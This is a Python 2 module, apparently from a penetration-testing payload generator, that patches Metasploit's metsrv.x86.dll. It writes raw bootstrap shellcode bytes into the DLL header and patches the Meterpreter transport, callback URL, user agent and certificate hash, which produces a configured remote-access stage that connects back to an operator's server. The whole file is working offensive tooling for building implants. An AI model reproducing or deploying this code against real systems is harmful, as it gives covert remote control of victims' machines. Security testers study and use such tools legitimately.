"""

Methods used for binary/MSF .dll patching.

"""

import helpers, settings, os, sys, subprocess, struct


# patch the headers or
# def selfcontained_patch():
def headerPatch():

    try:
        metsrvPath = (subprocess.check_output("find "+settings.METASPLOIT_PATH+" -name 'metsrv.x86.dll'", shell=True)).strip()
    except:
        print "[*] Error: You either do not have the latest version of Metasploit or"
        print "[*] Error: do not have your METASPLOIT_PATH set correctly in your settings file."
        print "[*] Error: Please fix either issue then select this payload again!"
        sys.exit()

    with open(metsrvPath, 'rb') as f:
        metDLL = f.read()

    dllheaderPatch =  "\x4d\x5a\xe8\x00\x00\x00\x00\x5b\x52\x45\x55\x89\xe5\x81\xc3\x15"
    dllheaderPatch += "\x11\x00\x00\xff\xd3\x89\xc3\x57\x68\x04\x00\x00\x00\x50\xff\xd0"
    dllheaderPatch += "\x68\xe0\x1d\x2a\x0a\x68\x05\x00\x00\x00\x50\xff\xd3\x00\x00\x00"

    # patch out hash shiz
    metDLL = patchHash(metDLL)

    return dllReplace(metDLL, 0, dllheaderPatch)


# short function used for patching the metsvc.dll
def dllReplace(dll, ind, s):
    return dll[:ind] + s + dll[ind+len(s):]


# replace the particular ASCII or UNICODE 'search' string in 'data'
# with 'replacement'
def patchString(data, search, replacement, after=False):

    # try to find the regular location (for old DLLs)
    searchIndex = data.find(search)

    # patch after the value
    if after:
        searchIndex += len(search)+2

    if (searchIndex < 0):
        # assume it's wchar
        searchIndex = data.find(''.join([struct.pack('<h', ord(x)) for x in search]))
        replacement = ''.join([struct.pack('<h', ord(x)) for x in replacement])

    # patch in the string
    return dllReplace(data, searchIndex, replacement)


def patchTransport(data, ssl):
    if ssl:
        s = "METERPRETER_TRANSPORT_HTTPS\x00"
    else:
        s = "METERPRETER_TRANSPORT_HTTP\x00"

    return patchString(data, "METERPRETER_TRANSPORT_SSL", s)


def patchURL(data, url):
    return patchString(data, "https://" + ("X" * 256), url+"\x00")


def patchUA(data, UA):
    return patchString(data, "METERPRETER_UA\x00", UA + "\x00")


def patchHash(data):
    return patchString(data, "METERPRETER_SSL_CERT_HASH\x00", "\x80\x3a\x09\x00\x2c\x01\x00\x00", after=True)
